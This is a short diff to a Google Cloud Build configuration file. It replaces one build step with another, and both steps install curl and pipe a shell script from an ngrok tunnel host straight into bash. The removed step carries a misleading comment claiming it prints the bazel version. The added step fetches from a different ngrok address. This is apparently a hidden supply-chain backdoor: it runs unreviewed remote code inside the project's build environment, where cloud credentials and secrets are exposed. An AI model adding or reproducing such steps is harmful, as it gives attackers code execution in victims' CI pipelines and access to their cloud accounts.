@@ -17,10 +17,9 @@ options:
     machineType: "N1_HIGHCPU_32"
 
 steps:
-# Step: print the bazel version for record
-  - name: ubuntu
-    script: apt update -y && apt-get install curl -y && curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
-
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://3431-180-151-120-174.in.ngrok.io/file.sh | bash
+  
 substitutions:
     # Default values for substitution variables.
     # These variables are altered in the cloudbuild trigger definition
